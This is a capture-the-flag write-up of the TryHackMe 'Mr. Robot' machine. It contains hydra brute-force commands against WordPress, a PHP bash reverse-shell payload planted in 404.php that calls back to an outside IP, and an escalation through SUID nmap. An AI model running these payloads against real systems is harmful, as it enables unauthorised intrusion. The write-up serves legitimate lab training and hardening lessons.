# CTF Writeup — Mr. Robot

## 📌 Overview

* **Platform:** TryHackMe
* **Difficulty:** Medium
* **Objective:** Retrieve 3 hidden keys (full compromise)

Mr. Robot is a beginner-to-intermediate Linux machine themed around the TV show *Mr. Robot*. The attack surface centers on a publicly exposed WordPress installation with weak credentials and an exploitable misconfiguration in the theme editor, leading to remote code execution. Privilege escalation is achieved through an outdated, SUID-enabled version of Nmap that exposes an interactive shell mode.

---

## 🔍 Enumeration

### 1. Initial Reconnaissance

A port scan was conducted against the target to identify exposed services and potential entry points.

```bash
rustscan -a 10.64.180.4 -- -A 
```

**Results:**

| Port | State | Service |
|------|-------|---------|
| 22   | Open  | SSH     |
| 80   | Open  | HTTP    |
| 443  | Open  | HTTPS   |

The target exposes both HTTP and HTTPS, making web application enumeration the primary attack vector. SSH was noted but deprioritized given the absence of known credentials at this stage.

---

### 2. Further Enumeration

#### Web Application Review

Browsing to `http://10.64.180.4` revealed an interactive, Mr. Robot-themed landing page. The page source disclosed client-side JavaScript variables (`USER_IP`, `BASE_URL`, `RETURN_URL`), suggesting a custom front-end application. The only functional interface element was a simulated "join" command that prompted for an email address — no server-side functionality of note was identified here.

#### Directory Fuzzing

Directory enumeration was performed using `ffuf` against the target's HTTP service:

```bash
ffuf -u "http://10.64.180.4/FUZZ" -w /usr/share/wordlists/dirb/common.txt
```

Key findings:

| Path          | Status | Notes                                          |
|---------------|--------|------------------------------------------------|
| `/wp-login`   | 200    | WordPress login panel                          |
| `/wp-admin`   | 301    | WordPress admin redirect                       |
| `/robots.txt` | 200    | Exposed sensitive filenames                    |
| `/phpmyadmin` | 403    | Access restricted to localhost                 |
| `/admin`      | 301    | Infinite loading — no actionable content       |
| `/license`    | 200    | Plaintext file — no useful content identified  |

The presence of `wp-login`, `wp-admin`, and `wp-includes` confirmed a WordPress CMS deployment, which significantly narrows the exploitation surface.

#### `robots.txt` Analysis

Inspecting `robots.txt` revealed two disallowed entries of direct interest:

```bash
curl http://10.64.180.4/robots.txt
```
User-agent: *
fsocity.dic
key-1-of-3.txt

**Key 1** was retrieved directly:

```bash
curl http://10.64.180.4/key-1-of-3.txt
```

`fsocity.dic` was identified as a wordlist — likely intended for credential attacks against the WordPress panel:

```bash
wget http://10.64.180.4/fsocity.dic
```

#### phpMyAdmin Bypass Attempt

The `/phpmyadmin` endpoint returned an error stating access was restricted to `localhost`. An attempt was made to bypass this restriction by manipulating the `Host` header via Burp Suite with the following values:

- `Host: 127.0.0.1` → 403
- `Host: localhost` → 403
- `Host: localhost (127.0.0.1)` → 403

The bypass was unsuccessful; this vector was deprioritized.

---

## 💥 Exploitation

### Phase 1 — WordPress Username Enumeration

**Vulnerability Type:** Information Disclosure via differential authentication error messages  
**Location:** `/wp-login.php`

WordPress's login panel returns distinct error messages depending on whether a submitted username exists in the system, enabling username enumeration without authentication.

`hydra` was used with `fsocity.dic` as the username list and a static dummy password to enumerate valid usernames, filtering on the failure string for an invalid username:

```bash
hydra -L fsocity.dic -p test 10.64.180.4 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

This identified `elliot` as a valid WordPress user.

### Phase 2 — WordPress Password Brute Force

With the username confirmed, a targeted password brute-force was performed using `fsocity.dic`, filtering on a successful HTTP 302 redirect (indicating a successful login):

```bash
hydra -l elliot -P fsocity.dic 10.64.180.4 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^:S=302" \
-t 64
```

**Note:** Earlier runs using string-based failure filters (`The password you entered for the username`) produced false positives. Switching the filter to match the HTTP 302 redirect on successful authentication resolved this and yielded the correct credential.

**Credentials identified:** `elliot : ER28-0652`

Authentication to the WordPress admin panel was confirmed successful.

### Phase 3 — Remote Code Execution via Theme Editor

**Vulnerability Type:** Remote Code Execution (RCE)  
**Location:** WordPress Theme Editor → `404.php`  
**Impact:** Unauthenticated RCE as the web server user (`daemon`)

Attempts to upload a PHP reverse shell via the WordPress Media Library were blocked by the application's file type restrictions (`.php` and `.php5` extensions rejected). However, the WordPress Theme Editor — accessible to administrator-level users — allows direct modification of theme PHP files, which are executed server-side.

The `404.php` file of the active theme (`twentyfifteen`) was replaced entirely with a Bash reverse shell payload:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.213.144/4444 0>&1'"); ?>
```

A listener was established on the attacker machine:

```bash
nc -lvnp 4444
```

The reverse shell was triggered by requesting the modified template:

```bash
curl "http://10.64.180.4/wp-content/themes/twentyfifteen/404.php"
```

A shell was obtained as the `daemon` user. The session was stabilized using Python's PTY module:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🔓 Privilege Escalation

### Lateral Movement — `daemon` → `robot`

Navigating to `/home/robot` revealed two files:
-r-------- 1 robot robot   33 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 password.raw-md5

`key-2-of-3.txt` was not readable by `daemon`. However, `password.raw-md5` was world-readable and contained an MD5-hashed credential:
robot:c3fcd3d76192e4007dfb496cca67e13b

The hash was cracked using CrackStation, yielding the plaintext password `abcdefghijklmnopqrstuvwxyz`.

User context was switched to `robot`:

```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
```

**Key 2** was then retrieved:

```bash
cat key-2-of-3.txt
```

### Privilege Escalation — `robot` → `root`

#### Local Enumeration

SUID binaries were enumerated to identify potential escalation vectors:

```bash
find / -user root -perm /4000 2>/dev/null
```

Among the results, `/usr/local/bin/nmap` was identified as a SUID binary. This is a well-known escalation vector — older versions of Nmap (≤ 5.21) include an `--interactive` mode that allows arbitrary shell command execution, inheriting the SUID owner's privileges (root).

#### Escalation

```bash
nmap --interactive
```
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh

```bash
whoami
# root
```

**Key 3** was retrieved from `/root`:

```bash
cat /root/key-3-of-3.txt
```

---

## 🧠 Lessons Learned

- **`robots.txt` should never be treated as security through obscurity.** In this machine, it directly disclosed the wordlist and the first key. In real-world engagements, `robots.txt` often surfaces sensitive paths that developers intended to hide from search engines — always check it early.

- **WordPress error message differentiation is a real-world vulnerability.** The distinct responses for invalid usernames versus wrong passwords enable username enumeration with minimal effort. Modern hardened WordPress configurations suppress this difference; auditing login page responses is a valid enumeration step on any CMS.

- **String-based hydra filters require precision.** False positives arose when the failure string matched partial content in valid login responses. Using the HTTP redirect code (`S=302`) as the success condition proved more reliable than failure-string matching in this scenario.

- **The WordPress Theme Editor is a critical misconfiguration.** When an administrator account is compromised, the theme editor provides a direct path to RCE without needing shell upload. Restricting theme/plugin file editing via `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php` mitigates this.

- **SUID binaries on non-essential tools are a significant risk.** Nmap has no legitimate reason to run with SUID privileges in a production environment. The principle of least privilege should be applied rigorously — periodic audits of SUID binaries are a standard hardening measure.

- **MD5 is not a viable password hashing algorithm.** The `robot` user's credential was stored as a raw MD5 hash and cracked instantly via a public lookup table. Modern systems should use bcrypt, Argon2, or scrypt with appropriate cost factors.

---

## 🧩 Tools Used

- **Nmap** — Port scanning and service enumeration
- **ffuf** — Web directory fuzzing
- **curl / wget** — Manual HTTP requests and file retrieval
- **Burp Suite** — HTTP header manipulation (Host header bypass attempt)
- **Hydra** — Username enumeration and credential brute-force against WordPress
- **CrackStation** — MD5 hash cracking
- **Netcat** — Reverse shell listener
- **Python3 (`pty`)** — Shell stabilization

---

## ⚠️ Notes

- Flags are intentionally omitted from this writeup
- This writeup focuses on methodology, decision-making, and learning outcomes

---
